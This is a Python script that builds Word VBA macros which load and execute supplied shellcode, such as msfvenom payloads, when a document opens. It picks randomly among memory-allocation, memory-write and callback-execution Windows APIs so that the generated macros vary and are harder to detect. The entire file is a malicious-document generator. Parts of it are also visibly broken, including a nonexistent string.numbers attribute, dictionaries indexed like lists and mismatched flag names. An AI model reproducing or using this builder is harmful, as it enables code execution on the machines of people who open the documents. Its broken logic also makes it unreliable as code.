#!/usr/bin/env python
import random, re, string, sys

__author__  = "Jeff White [karttoon] @noottra & Conor Richard [xenoscr] @xenoscr"
__email__   = "karttoon@gmail.com"
__version__ = "2.0.0"
__date__    = "11NOV2021"

# Global Variables
namedVars = {
        'allocateMemory': '',
        'createMemory': '',
        'memoryAddress': '',
        'copyMemory': '',
        'shellExecute': '',
        'getWindowHandle': '',
        'getProcessHandle': '',
        'getThreadHandle': '',
        'getModuleHandle': '',
        'windowHandle': '',
        'processHandle': '',
        'threadHandle': '',
        'moduleHandle': '',
        'shellCode': '',
        'shellLength': '',
        'byteArray': '',
        'executeResult': '',
        'rl': '',
        'ol': '',
        'zl': ''
        }

usedVarNames = []
allowedChars = string.ascii_letters + string.numbers


# Generate Random Variable Name
def randVarName(str_size, allowed_chars):
    while (True):
        randName = ''.join(random.choice(allowed_chars) for x in range(str_size))
        if (randName not in usedVarNames):
            return randName
        
# Return count of numbered function arguments
def countNumberedVars(inputString):
    pattern = '\{\d\}'
    return len(re.findall(pattern, inputString))

# Dictionary structures
# key = Function name
# value = List of flags for supporting code to include, followed by respective declarations and VBA

# Memory allocation functions
memAlloc = {
        'VirtualAlloc': {
            'globalFlags': {
                'zl': True
                },
            'functions': [
                { 
                    'declaration': 'Private Declare Function $allocateMemory Lib "kernel32" Alias "VirtualAlloc" (ByVal {0} As Long, ByVal {1} As Long, ByVal {2} As Long, ByVal {3} As Long) As Long\n',
                    'call': '$memoryAddress = $allocateMemory($zl, &H5000, &H1000, &H40)\n'
                    }
                ]
            },
        'NtAllocateVirtualMemory': {
            'globalFlags': {
                'rl': True,
                'zl': True
                },
            'functions': [
                {
                    'declaration': 'Private Declare Function $allocateMemory Lib "ntdll" Alias "NtAllocateVirtualMemory" ({0} As Long, {1} As Any, ByVal {2} As Long, {3} As Long, ByVal {4} As Long, ByVal {5} As Long) As Long\n',
                    'call': '$memoryAddress = $allocateMemory(ByVal -1, $rL, $zL, &H5000, &H1000, &H40)\n $memoryAddress = $rL\n'
                    }
                ]
            },
        'ZwAllocateVirtualMemory': {
            'globalFlags': {
                'rl': True,
                'zl': True 
                },
            'functions': [
                {
                    'declaration': 'Private Declare Function $allocateMemory Lib "ntdll" Alias "ZwAllocateVirtualMemory" ({0} As Long, {1} As Any, ByVal {2} As Long, {3} As Long, ByVal {4} As Long, ByVal {5} As Long) As Long\n',
                    'call': '$memoryAddress = $allocateMemory(ByVal -1, $rl, $zL, &H5000, &H1000, &H40)\n $memoryAddress = $rL\n',
                    }
                ]
            },
        'HeapAlloc': {
            'globalFlags': {
                'rl': True,
                'zl': True
                },
            'functions': [
                {
                    'declaration': 'Private Declare Function $createMemory Lib "kernel32" Alias "HeapCreate" (ByVal {0} As Long, ByVal {1} As Long, ByVal {2} As Long) As Long\n',
                    'call': '$rL = $createMemory(&H40000, $zL, $zL)\n',
                    },
                {
                    'declaration': 'Private Declare Function $allocateMemory Lib "kernel32" Alias "HeapAlloc" (ByVal {0} As Long, ByVal {1} As Long, ByVal {2} As Long) As Long\n',
                    'call': '$memoryAddress = $allocateMemory($rL, $zL, &H5000)\n',
                    }
                    
                ]
            }
        }
                    

# Memory writing functions
memWrite = {
        'RtlMoveMemory': {
            'globalFlags': {},
            'functions': [
                {
                    'declaration': 'Private Declare Sub $copyMemory Lib "ntdll" Alias "RtlMoveMemory" ({0} As Any, {1} As Any, ByVal {2} As Long)\n',
                    'call': '$copyMemory ByVal $memoryAddress, $byteArray(0), UBound($byteArray) + 1\n',
                    }
                ]
            },
        'WriteProcessMemory': {
            'globalVars': {
                'zl': True
                },
            'functions': [
                {
                    'declaration': 'Private Declare Function $copyMemory Lib "kernel32" Alias "WriteProcessMemory" (ByVal {0} As Long, ByVal {1} As Any, ByVal {2} As Long, ByVal {3} As Long, ByVal {4} As Long) As Long\n',
                    'call': '$copyMemory ByVal -1, $memoryAddress, VarPtr($byteArray(0)), UBound($byteArray) + 1, $zL\n',
                    }
                ]
            }
        }

# Shellcode execution functions
exeShell = {
        'CallWindowProcA': {
            'globalFlags': {
                'zl': True
                },
            'functions': [
                {
                    'declaration': 'Private Declare Function $shellExecute Lib "user32" Alias "CallWindowProcA" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any, ByVal {3} As Any, ByVal {4} As Any) As Long\n',
                    'call': '$executeResult = $shellExecute($memoryAddress, $zL, $zL, $zL, $zL)\n'
                    }
                ]
            },
        'CallWindowProcW': {
            'globalFlags': {
                'zl': True
                },
            'functions': [
                {
                    'declaration': 'Private Declare Function $shellExecute Lib "user32" Alias "CallWindowProcW" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any, ByVal {3} As Any, ByVal {4} As Any) As Long\n',
                    'call': '$executeResult = $shellExecute($memoryAddress, $zL, $zL, $zL, $zL)\n'
                    }
                ]
            },
        'DialogBoxIndirectParamA': {
            'globalFlags': {
                'wh': True,
                'mh': True,
                'ol': True
                },
            'functions': [
                {
                    'declaration': 'Private Declare Function $shellExecute Lib "user32" Alias "DialogBoxIndirectParamA" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any, ByVal {3} As Any, ByVal {4} As Any) As Long\n',
                    'call': '$executeResult = $shellExecute($moduleHandle, $moduleHandle, $windowHandle, $memoryAddress, $oL)\n'
                    }
                ]
            },
        'DialogBoxIndirectParamW': {
            'globalFlags': {
                'wh': True,
                'mh': True,
                'ol': True
                },
            'functions': [
                {
                    'declaration': 'Private Declare Function $shellExecute Lib "user32" Alias "DialogBoxIndirectParamW" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any, ByVal {3} As Any, ByVal {4} As Any) As Long\n',
                    'call': '$executeResult = $shellExecute($moduleHandle, $moduleHandle, $windowHandle, $memoryAddress, $oL)\n'
                    }
                ]
            },
        'EnumCalendarInfoA': {
            'globalFlags': {
                'ol': True,
                'rl': True
                },
            'functions': [
                {
                    'declaration': 'Private Declare Function $shellExecute Lib "kernel32" Alias "EnumCalendarInfoA" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any, ByVal {3} As Any) As Long\n',
                    'call': '$rL = 3072\n $executeResult = $shellExecute($memoryAddress, $rL, $oL, $oL)\n'
                    }
                ]
            },
        'EnumCalendarInfoW': {
            'globalFlags': {
                'ol': True,
                'rl': True
                },
            'functions': [
                {
                    'declaration': 'private declare function $shellexecute lib "kernel32" alias "enumcalendarinfow" (byval {0} as any, byval {1} as any, byval {2} as any, byval {3} as any) as long\n',
                    'call': 'rL = 3072\n$executeResult = $shellExecute($memoryAddress, $rL, $oL, $oL)\n'
                    }
                ]
            },
        'EnumDataFormatsA': {
            'globalFlags': {
                'zl': True
                },
            'functions': [
                {
                    'declaration': 'Private Declare Function $shellExecute Lib "kernel32" Alias "EnumDateFormatsA" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any) As Long\n',
                    'call': '$executeResult = $shellExecute($memoryAddress, $zL, $zL)\n'
                    }
                ]
            },
        'EnumDataFormatsW': {
            'globalFlags': {
                'zl': True
                },
            'functions': [
                {
                    'declaration': 'Private Declare Function $shellExecute Lib "kernel32" Alias "EnumDateFormatsW" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any) As Long\n',
                    'call': '$executeResult = $shellExecute($memoryAddress, $zL, $zL)\n'
                    }
                ]
            },
        'EnumDesktopWindows': {
            'globalFlags': {
                'zl': True
                },
            'functions': [
                {
                    'declaration': 'Private Declare Function $shellExecute Lib "user32" Alias "EnumDesktopWindows" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any) As Long\n',
                    'call': '$executeResult = $shellExecute($zL, $memoryAddress, $zL)\n'
                    }
                ]
            },
        'EnumDesktopsA': {
            'globalFlags': {
                'zl': True
                },
            'functions': [
                {
                    'declaration': 'Private Declare Function $shellExecute Lib "user32" Alias "EnumDesktopsA" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any) As Long\n',
                    'call': '$executeResult = $shellExecute($zL, $memoryAddress, $zL)\n'
                    }
                ]
            },
        'EnumDesktopsW': {
            'globalFlags': {
                'zl': True
                },
            'functions': [
                {
                    'declaration': 'Private Declare Function $shellExecute Lib "user32" Alias "EnumDesktopsW" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any) As Long\n',
                    'call': '$executeResult = $shellExecute($zL, $memoryAddress, $zL)\n'
                    }
                ]
            },
        'EnumLanguageGroupLocalesA': {
            'globalFlags': {
                'zl': True,
                'ol': True
                },
            'functions': [
                {
                    'declaration': 'Private Declare Function $shellExecute Lib "kernel32" Alias "EnumLanguageGroupLocalesA" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any, ByVal {3} As Any) As Long\n',
                    'call': '$executeResult = $shellExecute($memoryAddress, $oL, $zL, $zL)\n'
                    }
                ]
            },
        'EnumLanguageGroupLocalesW': {
            'globalFlags': {
                'zl': True,
                'ol': True
                },
            'functions': [
                {
                    'declaration': 'Private Declare Function $shellExecute Lib "kernel32" Alias "EnumLanguageGroupLocalesW" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any, ByVal {3} As Any) As Long\n',
                    'call': '$executeResult = $shellExecute($memoryAddress, $oL, $zL, $zL)\n'
                    }
                ]
            },
        'EnumPropsExA': {
            'globalFlags': {
                'wh': True
                },
            'functions': [
                {
                    'declaration': 'Private Declare Function $shellExecute Lib "user32" Alias "EnumPropsExA" (ByVal {0} As Any, ByVal {1} As Any) As Long\n',
                    'call': '$executeResult = $shellExecute($windowHandle, $memoryAddress)\n'
                    }
                ]
            },
        'EnumPropsExW': {
            'globalFlags': {
                'wh': True
                },
            'functions': [
                {
                    'declaration': 'Private Declare Function $shellExecute Lib "user32" Alias "EnumPropsExW" (ByVal {0} As Any, ByVal {1} As Any) As Long\n',
                    'call': '$executeResult = $shellExecute($windowHandle, $memoryAddress)\n'
                    }
                ]
            },
        'EnumPwrSchemes': {
            'globalFlags': {
                'zl': True
                },
            'functions': [
                {
                    'declaration': 'Private Declare Function $shellExecute Lib "powrprof" Alias "EnumPwrSchemes" (ByVal {0} As Any, ByVal {1} As Any) As Long\n',
                    'call': '$executeResult = $shellExecute($memoryAddress, $zL)\n'
                    }
                ]
            },
        'EnumResourceTypesA': {
            'globalFlags': {
                'zl': True
                },
            'functions': [
                {
                    'declaration': 'Private Declare Function $shellExecute Lib "kernel32" Alias "EnumResourceTypesA" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any) As Long\n',
                    'call': '$executeResult = $shellExecute($zL, $memoryAddress, $zL)\n'
                    }
                ]
            },
        'EnumResourceTypesW': {
            'globalFlags': {
                'zl': True
                },
            'functions': [
                {
                    'declaration': 'Private Declare Function $shellExecute Lib "kernel32" Alias "EnumResourceTypesW" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any) As Long\n',
                    'call': '$executeResult = $shellExecute($zL, $memoryAddress, $zL)\n'
                    }
                ]
            },
        'EnumResourceTypesExA': {
            'globalFlags': {
                'zl': True
                },
            'functions': [
                {
                    'declaration': 'Private Declare Function $shellExecute Lib "kernel32" Alias "EnumResourceTypesExA" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any, ByVal {3} As Any, ByVal {4} As Any) As Long\n',
                    'call': '$executeResult = $shellExecute($zL, $memoryAddress, $zL, $zL, $zL)\n'
                    }
                ]
            },
        'EnumResourceTypesExW': {
            'globalFlags': {
                'zl': True
                },
            'functions': [
                {
                    'declaration': 'Private Declare Function $shellExecute Lib "kernel32" Alias "EnumResourceTypesExW" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any, ByVal {3} As Any, ByVal {4} As Any) As Long\n',
                    'call': '$executeResult = $shellExecute($zL, $memoryAddress, $zL, $zL, $zL)\n'
                    }
                ]
            },
        'EnumSystemCodePagesA': {
            'globalFlags': {
                'zl': True
                },
            'functions': [
                {
                    'declaration': 'Private Declare Function $shellExecute Lib "kernel32" Alias "EnumSystemCodePagesA" (ByVal {0} As Any, ByVal {1} As Any) As Long\n',
                    'call': '$executeResult = $shellExecute($memoryAddress, $zL)\n'
                    }
                ]
            },
        'EnumSystemCodePagesW': {
            'globalFlags': {
                'zl': True
                },
            'functions': [
                {
                    'declaration': 'Private Declare Function $shellExecute Lib "kernel32" Alias "EnumSystemCodePagesW" (ByVal {0} As Any, ByVal {1} As Any) As Long\n',
                    'call': '$executeResult = $shellExecute($memoryAddress, $zL)\n'
                    }
                ]
            },
        'EnumSystemLanguageGroupsA': {
            'globalFlags': {
                'zl': True
                },
            'functions': [
                {
                    'declaration': 'Private Declare Function $shellExecute Lib "kernel32" Alias "EnumSystemLanguageGroupsA" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any) As Long\n',
                    'call': '$executeResult = $shellExecute($memoryAddress, $zL, $zL)\n'
                    }
                ]
            },
        'EnumSystemLanguageGroupsW': {
            'globalFlags': {
                'zl': True
                },
            'functions': [
                {
                    'declaration': 'Private Declare Function $shellExecute Lib "kernel32" Alias "EnumSystemLanguageGroupsW" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any) As Long\n',
                    'call': '$executeResult = $shellExecute($memoryAddress, $zL, $zL)\n'
                    }
                ]
            },
        'EnumSystemLocalesA': {
            'globalFlags': {
                'zl': True
                },
            'functions': [
                {
                    'declaration': 'Private Declare Function $shellExecute Lib "kernel32" Alias "EnumSystemLocalesA" (ByVal {0} As Any, ByVal {1} As Any) As Long\n',
                    'call': '$executeResult = $shellExecute($memoryAddress, $zL)\n'
                    }
                ]
            },
        'EnumSystemLocalesW': {
            'globalFlags': {
                'zl': True
                },
            'functions': [
                {
                    'declaration': 'Private Declare Function $shellExecute Lib "kernel32" Alias "EnumSystemLocalesW" (ByVal {0} As Any, ByVal {1} As Any) As Long\n',
                    'call': '$executeResult = $shellExecute($memoryAddress, $zL)\n'
                    }
                ]
            },
        'EnumThreadWindows': {
            'globalFlags': {
                'zl': True
                },
            'functions': [
                {
                    'declaration': 'Private Declare Function $shellExecute Lib "user32" Alias "EnumThreadWindows" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any) As Long\n',
                    'call': '$executeResult = $shellExecute($zL, $memoryAddress, $zL)\n'
                    }
                ]
            },
        'EnumTimeFormatsA': {
            'globalFlags': {
                'zl': True
                },
            'functions': [
                {
                    'declaration': 'Private Declare Function $shellExecute Lib "kernel32" Alias "EnumTimeFormatsA" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any) As Long\n',
                    'call': '$executeResult = $shellExecute($memoryAddress, $zL, $zL)\n'
                    }
                ]
            },
        'EnumTimeFormatsW': {
            'globalFlags': {
                'zl': True
                },
            'functions': [
                {
                    'declaration': 'Private Declare Function $shellExecute Lib "kernel32" Alias "EnumTimeFormatsW" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any) As Long\n',
                    'call': '$executeResult = $shellExecute($memoryAddress, $zL, $zL)\n'
                    }
                ]
            },
        'EnumUILanguagesA': {
            'globalFlags': {
                'zl': True
                },
            'functions': [
                {
                    'declaration': 'Private Declare Function $shellExecute Lib "kernel32" Alias "EnumUILanguagesA" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any) As Long\n',
                    'call': '$executeResult = $shellExecute($memoryAddress, $zL, $zL)\n'
                    }
                ]
            },
        'EnumUILanguagesW': {
            'globalFlags': {
                'zl': True
                },
            'functions': [
                {
                    'declaration': 'Private Declare Function $shellExecute Lib "kernel32" Alias "EnumUILanguagesW" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any) As Long\n',
                    'call': '$executeResult = $shellExecute($memoryAddress, $zL, $zL)\n'
                    }
                ]
            },
        'EnumWindowStationsA': {
            'globalFlags': {
                'zl': True
                },
            'functions': [
                {
                    'declaration': 'Private Declare Function $shellExecute Lib "user32" Alias "EnumWindowStationsA" (ByVal {0} As Any, ByVal {1} As Any) As Long\n',
                    'call': '$executeResult = $shellExecute($memoryAddress, $zL)\n'
                    }
                ]
            },
        'EnumWindowStationsW': {
            'globalFlags': {
                'zl': True
                },
            'functions': [
                {
                    'declaration': 'Private Declare Function $shellExecute Lib "user32" Alias "EnumWindowStationsW" (ByVal {0} As Any, ByVal {1} As Any) As Long\n',
                    'call': '$executeResult = $shellExecute($memoryAddress, $zL)\n'
                    }
                ]
            },
        'EnumWindows': {
            'globalFlags': {
                'zl': True
                },
            'functions': [
                {
                    'declaration': 'Private Declare Function $shellExecute Lib "user32" Alias "EnumWindows" (ByVal {0} As Any, ByVal {1} As Any) As Long\n',
                    'call': '$executeResult = $shellExecute($memoryAddress, $zL)\n'
                    }
                ]
            },
        'EnumerateLoadedModules': {
            'globalFlags': {
                'ph': True,
                'zl': True
                },
            'functions': [
                {
                    'declaration': 'Private Declare Function $shellExecute Lib "dbghelp" Alias "EnumerateLoadedModules" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any) As Long\n',
                    'call': '$executeResult = $shellExecute($processHandle, $memoryAddress, $zL)\n'
                    }
                ]
            },
        'EnumerateLoadedModulesEx': {
            'globalFlags': {
                'ph': True,
                'zl': True
                },
            'functions': [
                {
                    'declaration': 'Private Declare Function $shellExecute Lib "dbghelp" Alias "EnumerateLoadedModulesEx" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any) As Long\n',
                    'call': '$executeResult = $shellExecute($processHandle, $memoryAddress, $zL)\n'
                    }
                ]
            },
        'EnumerateLoadedModulesExW': {
            'globalFlags': {
                'ph': True,
                'zl': True
                },
            'functions': [
                {
                    'declaration': 'Private Declare Function $shellExecute Lib "dbghelp" Alias "EnumerateLoadedModulesExW" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any) As Long\n',
                    'call': '$executeResult = $shellExecute($processHandle, $memoryAddress, $zL)\n'
                    }
                ]
            },
        'GrayStringA': {
            'globalFlags': {
                'mh': True,
                'ol': True
                },
            'functions': [
                {
                    'declaration': 'Private Declare Function $shellExecute Lib "user32" Alias "GrayStringA" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any, ByVal {3} As Any, ByVal {4} As Any, ByVal {5} As Any, ByVal {6} As Any, ByVal {7} As Any, ByVal {8} As Any) As Long\n',
                    'call': '$executeResult = $shellExecute($moduleHandle, $oL, $memoryAddress, $oL, $oL, $oL, $oL, $oL, $oL)\n'
                    }
                ]
            },
        'GrayStringW': {
            'globalFlags': {
                'mh': True,
                'ol': True
                },
            'functions': [
                {
                    'declaration': 'Private Declare Function $shellExecute Lib "user32" Alias "GrayStringW" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any, ByVal {3} As Any, ByVal {4} As Any, ByVal {5} As Any, ByVal {6} As Any, ByVal {7} As Any, ByVal {8} As Any) As Long\n',
                    'call': '$executeResult = $shellExecute($moduleHandle, $oL, $memoryAddress, $oL, $oL, $oL, $oL, $oL, $oL)\n'
                    }
                ]
            },
        'NotifyIpInterfaceChange': {
            'globalFlags': {
                'zl': True,
                'ol': True
                },
            'functions': [
                {
                    'declaration': 'Private Declare Function $shellExecute Lib "iphlpapi" Alias "NotifyIpInterfaceChange" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any, ByVal {3} As Any, ByVal {4} As Any) As Long\n',
                    'call': '$executeResult = $shellExecute($zL, $memoryAddress, $oL, $oL, $oL)\n'
                    }
                ]
            },
        'NotifyTeredoPortChange': {
            'globalFlags': {
                'ol': True
                },
            'functions': [
                {
                    'declaration': 'Private Declare Function $shellExecute Lib "iphlpapi" Alias "NotifyTeredoPortChange" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any, ByVal {3} As Any) As Long\n',
                    'call': '$executeResult = $shellExecute($memoryAddress, $oL, $oL, $oL)\n'
                    }
                ]
            },
        'NotifyUnicastIpAddressChange': {
            'globalFlags': {
                'ol': True,
                'zl': True
                },
            'functions': [
                {
                    'declaration': 'Private Declare Function $shellExecute Lib "iphlpapi" Alias "NotifyUnicastIpAddressChange" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any, ByVal {3} As Any, ByVal {4} As Any) As Long\n',
                    'call': '$executeResult = $shellExecute($zL, $memoryAddress, $oL, $oL, $oL)\n'
                    }
                ]
            },
        'SHCreateThread': {
            'globalFlags': {
                'zl': True
                },
            'functions': [
                {
                    'declaration': 'Private Declare Function $shellExecute Lib "shlwapi" Alias "SHCreateThread" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any, ByVal {3} As Any) As Long\n',
                    'call': '$executeResult = $shellExecute($zL, $zL, $zL, $memoryAddress)\n'
                    }
                ]
            },
        'SHCreateThreadWithHandle': {
            'globalFlags': {
                'ph': True,
                'zl': True
                },
            'functions': [
                {
                    'declaration': 'Private Declare Function $shellExecute Lib "shlwapi" Alias "SHCreateThreadWithHandle" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any, ByVal {3} As Any, ByVal {4} As Any) As Long\n',
                    'call': '$executeResult = $shellExecute($zL, $zL, $zL, $memoryAddress, $processHandle)\n'
                    }
                ]
            },
        'SendMessageCallbackA': {
            'globalFlags': {
                'wh': True,
                'zl': True
                },
            'functions': [
                {
                    'declaration': 'Private Declare Function $shellExecute Lib "user32" Alias "SendMessageCallbackA" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any, ByVal {3} As Any, ByVal {4} As Any, ByVal {5} As Any) As Long\n',
                    'call': '$executeResult = $shellExecute($windowHandle, $zL, $zL, $zL, $memoryAddress, $zL)\n'
                    }
                ]
            },
        'SendMessageCallbackW': {
            'globalFlags': {
                'wh': True,
                'zl': True
                },
            'functions': [
                {
                    'declaration': 'Private Declare Function $shellExecute Lib "user32" Alias "SendMessageCallbackW" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any, ByVal {3} As Any, ByVal {4} As Any, ByVal {5} As Any) As Long\n',
                    'call': '$executeResult = $shellExecute($windowHandle, $zL, $zL, $zL, $memoryAddress, $zL)\n'
                    }
                ]
            },
# Works except you need to trigger an event
#        'SetWinEventHook': {
#            'globalFlags': {
#                'mh': True,
#                'ol': True,
#                'zl': True
#                },
#            'functions': [
#                {
#                    'declaration': 'Private Declare Function $shellExecute Lib "user32" Alias "SetWinEventHook" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any, ByVal {3} As Any, ByVal {4} As Any, ByVal {5} As Any, ByVal {6} As Any) As Long\n',
#                    'call': '$executeResult = $shellExecute($zL, $oL, $moduleHandle, $memoryAddress, $zL, $zL, $zL)\n'
#                    }
#                ]
#            },
        'SetWindowsHookExA': {
            'globalFlags': {
                'zl': True
                },
            'functions': [
                {
                    'declaration': 'Private Declare Function $shellExecute Lib "user32" Alias "SetWindowsHookExA" (ByVal {0} As Any, ByVal {1} As Any, ByVal {2} As Any, ByVal {3} As Any) As Long\n',
                    'call': '$executeResult = $shellExecute($zL, $memoryAddress, $zL, $zL)\n'
                    }
                ]
            }
        }

# Random select functions from each dictionary
allocFunc = list(memAlloc.keys())[random.randrange(0,len(memAlloc),1)]
writeFunc = list(memWrite.keys())[random.randrange(0,len(memWrite),1)]
shellFunc = list(exeShell.keys())[random.randrange(0,len(exeShell),1)]

# Determine flags for support code required by the functions
macFlag = []

for flagList in (memAlloc[allocFunc][0], memWrite[writeFunc][0], exeShell[shellFunc][0]):
    for flag in flagList:
        if flag not in macFlag:
            macFlag.append(flag)

macro = ''

macro += '''
################################################
#                                              #
#   Copy VBA to Microsoft Office 97-2003 DOC   #
#                                              #
#   Alloc: %-35s #
#   Write: %-35s #
#   ExeSC: %-35s #
#                                              #
################################################\n
''' % (allocFunc, writeFunc, shellFunc)

# Headers
macro += memAlloc[allocFunc][1]
macro += memWrite[writeFunc][1]
macro += exeShell[shellFunc][1]
if 'WH' in macFlag:
    macro += 'Private Declare Function getWindowHandle Lib "user32" Alias "GetActiveWindow" () As Long'
if 'PH' in macFlag:
    macro += 'Private Declare Function getProcessHandle Lib "kernel32" Alias "GetCurrentProcess" () As Long'
if 'TH' in macFlag:
    macro += 'Private Declare Function getThreadHandle Lib "kernel32" Alias "GetCurrentThread" () As Long'
if 'MH' in macFlag:
    macro += 'Private Declare Function getModuleHandle Lib "kernel32" Alias "GetModuleHandleA" (ByVal lpModuleName As String) As Long'

# Body
macro += '''\n
Private Sub Document_Open()

Dim shellCode As String
Dim shellLength As Long
Dim byteArray() As Byte
Dim memoryAddress As Long
'''

# Supporting code for functions
if 'WH' in macFlag:
    macro += 'Dim windowHandle As Long\n' +\
             'windowHandle = getWindowHandle()\n'
if 'PH' in macFlag:
    macro += 'Dim ProcessHandle As Long\n' +\
             'ProcessHandle = getProcessHandle()\n'
if 'TH' in macFlag:
    macro += 'Dim threadHandle As Long\n' +\
             'threadHandle = getThreadHandle()\n'
if 'MH' in macFlag:
    macro += 'Dim moduleHandle As Long\n' +\
             'moduleHandle = getModuleHandle(vbNullString)\n'
if 'ZL' in macFlag:
    macro += 'Dim zL As Long\n' +\
             'zL = 0\n'
if 'OL' in macFlag:
    macro += 'Dim oL As Long\n' +\
             'oL = 1\n'
if 'RL' in macFlag:
    macro += 'Dim rL As Long\n'

# Filter msfvenom C/Py output to get a hex-string, 'FEEDADEADFEDBABE'
if len(sys.argv) == 2:
    sys.argv[1] = sys.argv[1].replace('unsigned char buf[]', '')
    sys.argv[1] = sys.argv[1].replace('\n', '')
    sys.argv[1] = sys.argv[1].replace('buf', '')
    sys.argv[1] = sys.argv[1].replace('+', '')
    sys.argv[1] = sys.argv[1].replace('=', '')
    sys.argv[1] = sys.argv[1].replace('\\x', '')
    sys.argv[1] = sys.argv[1].replace('"', '')
    sys.argv[1] = sys.argv[1].replace(';', '')
    sys.argv[1] = sys.argv[1].replace(' ', '')

    print("temp\n%s\n" % sys.argv[1])

    if len(sys.argv[1]) > 256:
        macro += '''
shellCode = "%s"''' % sys.argv[1][0:256]
        for i in range(256,len(sys.argv[1]),256):
            macro += '''
shellCode = shellCode & "%s"''' % sys.argv[1][i:i+256]
    else:
        macro += '''
shellCode = "%s"''' % sys.argv[1]
else:
    print('[!] ERROR: Supply hexadecimal shellcode as input (eg msfvenom -p windows/exec CMD=\'calc.exe\' -f c)')
    sys.exit(1)

macro += '''\n
shellLength = Len(shellCode) / 2
ReDim byteArray(0 To shellLength)

For i = 0 To shellLength - 1

    If i = 0 Then
        pos = i + 1
    Else
        pos = i * 2 + 1
    End If
    Value = Mid(shellCode, pos, 2)
    byteArray(i) = Val("&H" & Value)

Next\n
'''

macro += memAlloc[allocFunc][2] + '\n'
macro += memWrite[writeFunc][2] + '\n'
macro += exeShell[shellFunc][2] + '\n'

macro += "End Sub"

print(macro)
